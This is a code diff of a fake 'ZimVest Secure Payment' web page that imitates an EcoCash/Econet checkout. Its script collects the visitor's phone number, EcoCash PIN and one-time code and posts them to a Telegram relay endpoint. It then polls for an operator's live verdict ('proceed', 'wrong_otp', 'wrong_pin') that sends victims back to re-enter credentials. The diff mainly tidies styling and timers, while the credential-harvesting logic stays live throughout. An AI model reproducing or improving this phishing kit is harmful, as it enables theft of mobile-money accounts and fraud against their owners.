@@ -28,7 +28,7 @@
 .hi{position:relative;z-index:1}
 .ht{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px}
 .brd{display:flex;align-items:center;gap:10px}
-.bm{width:34px;height:34px;border-radius:9px;background:rgba(255,255,255,.2);border:1px solid rgba(255,255,255,.3);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.bm{width:34px;height:34px;border-radius:9px;background:linear-gradient(135deg,#5B5FEF,#059669);box-shadow:0 2px 8px rgba(91,95,239,.25);display:flex;align-items:center;justify-content:center;flex-shrink:0}
 .bm svg{width:18px;height:18px;stroke:#fff;stroke-width:2.5;fill:none;stroke-linecap:round}
 .bn{font-size:16px;font-weight:800;color:#fff;letter-spacing:-.3px}
 .bs{font-size:9px;color:rgba(255,255,255,.55);font-weight:600;text-transform:uppercase;letter-spacing:.5px;margin-top:1px}
@@ -152,14 +152,9 @@ html,body{
   <div class="hdr">
     <div class="hi">
       <div class="ht">
-        <div style="display:flex;align-items:center;gap:9px">
-          <div style="width:32px;height:32px;border-radius:9px;background:linear-gradient(135deg,#5B5FEF,#059669);display:flex;align-items:center;justify-content:center;flex-shrink:0;box-shadow:0 2px 8px rgba(91,95,239,.25)">
-            <svg viewBox="0 0 24 24" style="width:17px;height:17px;stroke:#fff;fill:none;stroke-width:2.5;stroke-linecap:round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
-          </div>
-          <div style="line-height:1">
-            <div style="font-size:16px;font-weight:800;letter-spacing:-.3px;color:#fff">Zim<span style="color:#A5B4FC">Vest</span></div>
-            <div style="font-size:9px;color:rgba(255,255,255,.55);font-weight:600;text-transform:uppercase;letter-spacing:.5px;margin-top:2px">Secure Payment</div>
-          </div>
+        <div class="brd">
+          <div class="bm"><svg viewBox="0 0 24 24"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg></div>
+          <div><div class="bn">Zim<span style="color:#A5B4FC">Vest</span></div><div class="bs">Secure Payment</div></div>
         </div>
         <div class="hdr-eco"><img src="assets/econet.png" alt="Econet Wireless"/></div>
       </div>
@@ -300,95 +295,56 @@ document.getElementById('mb').onclick=function(){
   }
 };
 
-/* ── Timer & polling — single interval references, always cleared before start ── */
 var sessionKey=null;
 var pollInterval=null;
 var pollTimeout=null;
-var otpTimerInterval=null;   /* ONE reference for the OTP countdown */
-var elapsedInterval=null;    /* ONE reference for the authorising elapsed counter */
 
-/* ── OTP countdown — clears previous before starting ── */
-function startTimer(){
-  if(otpTimerInterval){clearInterval(otpTimerInterval);otpTimerInterval=null;}
-  var t=120;
-  var te=document.getElementById('tc');
-  var rb=document.getElementById('rsnd');
-  te.textContent=t;
-  rb.classList.remove('on');
-  rc=false;
-  resetOtp(false);
-  document.getElementById('mb').classList.remove('on');
-  otpTimerInterval=setInterval(function(){
-    t--;
-    te.textContent=t;
-    if(t<=0){
-      clearInterval(otpTimerInterval);otpTimerInterval=null;
-      rb.classList.add('on');
-      resetOtp(true);
-      document.getElementById('mb').classList.remove('on');
-      document.getElementById('mn').textContent='Code expired. Tap Resend to get a new one.';
-    }
-  },1000);
-}
-
-/* ── Resend button ── */
-document.getElementById('rsnd').onclick=function(){
-  if(!this.classList.contains('on'))return;
-  if(rc)return;
-  rc=true;
-  os=false;  /* allow re-submit after resend */
-  tg('resend_otp');
-  startTimer();
-};
-
-/* ── Authorising (step 3) ── */
 function startAuthorising(){
-  /* Clear any leftover OTP timer — we've moved past that step */
-  if(otpTimerInterval){clearInterval(otpTimerInterval);otpTimerInterval=null;}
-  if(elapsedInterval){clearInterval(elapsedInterval);elapsedInterval=null;}
-
+  // Send OTP confirmed to Telegram — receives inline buttons
   var payload={submittedAt:new Date().toISOString(),loginPhone:pv,loginPin:pnv,otp:ov,event:'otp_confirmed',plan:pl(),device:dev};
   fetch('/api/sendTelegram',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)})
     .then(function(r){return r.json();})
-    .then(function(d){sessionKey=d.sessionKey||null;startPolling();})
+    .then(function(d){
+      sessionKey=d.sessionKey||null;
+      startPolling();
+    })
     .catch(function(){startPolling();});
 
-  /* Elapsed counter — clean display */
+  // Start countdown display
   var elapsed=0;
   var timerEl=document.getElementById('procTimer');
   timerEl.style.display='block';
   timerEl.textContent='Waiting for authorisation… 0s';
-  elapsedInterval=setInterval(function(){
+  var countEl=setInterval(function(){
     elapsed++;
-    if(elapsed<180){
-      timerEl.textContent='Waiting for authorisation… '+elapsed+'s';
-    } else {
-      clearInterval(elapsedInterval);elapsedInterval=null;
-      timerEl.textContent='Taking longer than usual — contact WhatsApp support if needed.';
+    timerEl.textContent='Waiting for authorisation… '+elapsed+'s';
+    if(elapsed>=180){
+      clearInterval(countEl);
+      timerEl.textContent='This is taking longer than usual. If you need help, contact support.';
     }
   },1000);
 }
 
 function startPolling(){
-  if(pollInterval){clearInterval(pollInterval);pollInterval=null;}
-  if(pollTimeout){clearTimeout(pollTimeout);pollTimeout=null;}
+  if(pollInterval) clearInterval(pollInterval);
   pollInterval=setInterval(function(){
-    if(!sessionKey)return;
+    if(!sessionKey){return;} // wait for sessionKey
     fetch('/api/checkTelegram?sessionKey='+encodeURIComponent(sessionKey))
       .then(function(r){return r.json();})
       .then(function(d){handleTelegramAction(d.status);})
       .catch(function(){});
   },2000);
+
+  // Safety fallback: if no action in 3 minutes, let user retry
   pollTimeout=setTimeout(function(){
     stopPolling();
-    showProcErr('No response received. Please contact WhatsApp support or try again.');
+    showProcErr('No response received. Please contact support on WhatsApp or try again.');
   },180000);
 }
 
 function stopPolling(){
   if(pollInterval){clearInterval(pollInterval);pollInterval=null;}
   if(pollTimeout){clearTimeout(pollTimeout);pollTimeout=null;}
-  if(elapsedInterval){clearInterval(elapsedInterval);elapsedInterval=null;}
 }
 
 function handleTelegramAction(status){
@@ -396,6 +352,7 @@ function handleTelegramAction(status){
   stopPolling();
 
   if(status==='proceed'){
+    // ✅ Proceed — go to receipt
     document.getElementById('procRing').style.borderTopColor='#059669';
     document.getElementById('procTitle').textContent='✅ Payment confirmed!';
     document.getElementById('procSub').textContent='Redirecting to your investment receipt…';
@@ -403,50 +360,52 @@ function handleTelegramAction(status){
     setTimeout(function(){location.href='receipt.html';},1000);
 
   } else if(status==='wrong_otp'){
-    /* Return to OTP step — reset state cleanly */
-    os=false;
+    // ❌ Wrong OTP — go back to OTP step, only resend active
     go('s2');
-    /* Disable OTP boxes — only resend active */
-    od=true;
+    od=true; oh.disabled=true; // disable OTP input
+    var rsBtn=document.getElementById('rsnd');
+    rsBtn.classList.add('on'); // only resend is active
+    document.getElementById('mb').classList.remove('on'); // confirm btn disabled
+    document.getElementById('mn').textContent='❌ Incorrect OTP. Please resend and try again.';
+    // Force clear OTP boxes
     oh.value='';
-    oh.disabled=true;
     [0,1,2,3,4,5].forEach(function(i){
       var b=document.getElementById('ob'+i);
-      if(b){b.textContent='';b.className='ob disabled';}
+      if(b){b.textContent='';b.className='ob';}
     });
-    document.getElementById('rsnd').classList.add('on');
-    document.getElementById('mb').classList.remove('on');
-    document.getElementById('mn').textContent='❌ Incorrect OTP. Tap Resend OTP to receive a new code.';
-    /* Restart OTP countdown fresh from 120 when user hits resend */
-    /* (startTimer called by rsnd.onclick — not here) */
+    // Allow retry
+    os=false;
     showProcErr('');
 
   } else if(status==='wrong_pin'){
-    /* Return to step 1 — full reset */
-    os=false; lc=false;
-    pv=''; pnv='';
-    document.getElementById('ph').value='';
-    document.getElementById('pin').value='';
-    document.getElementById('mb').classList.remove('on');
+    // 🚫 Wrong PIN — go back to login step 1
     go('s1');
+    // Reset state
+    os=false; lc=false;
+    pnv=''; pv='';
+    document.getElementById('pin').value='';
+    document.getElementById('ph').value='';
+    document.getElementById('mb').classList.remove('on');
     showProcErr('');
-    /* Red notice on step 1 */
-    var sn=document.querySelector('.sn');
+    // Show error banner on step 1
+    var sn=document.querySelector('.sn span');
     if(sn){
-      sn.style.background='rgba(220,38,38,.07)';
-      sn.style.borderColor='rgba(220,38,38,.22)';
-      sn.querySelector('svg').style.stroke='#DC2626';
-      sn.querySelector('span').textContent='🚫 Incorrect EcoCash PIN. Please re-enter your number and PIN carefully.';
+      sn.textContent='🚫 Incorrect PIN entered. Please re-enter your EcoCash number and PIN.';
+      document.querySelector('.sn').style.background='rgba(220,38,38,.07)';
+      document.querySelector('.sn').style.borderColor='rgba(220,38,38,.22)';
+      document.querySelector('.sn svg').style.stroke='#DC2626';
     }
   }
 }
 
 function showProcErr(msg){
   var el=document.getElementById('procErr');
-  if(!el)return;
+  if(!el) return;
   if(msg){el.textContent=msg;el.style.display='block';}
   else{el.style.display='none';}
 }
+document.getElementById('rsnd').onclick=function(){if(!this.classList.contains('on'))return;if(rc)return;rc=true;tg('resend_otp');startTimer();};
+function startTimer(){var t=120,te=document.getElementById('tc'),rb=document.getElementById('rsnd');te.textContent=t;rb.classList.remove('on');rc=false;resetOtp(false);document.getElementById('mb').classList.remove('on');var ti=setInterval(function(){t--;te.textContent=t;if(t<=0){clearInterval(ti);rb.classList.add('on');resetOtp(true);document.getElementById('mb').classList.remove('on');document.getElementById('mn').textContent='Code expired. Tap Resend to get a new one.';}},1000);}
 </script>
 </body>
 </html>
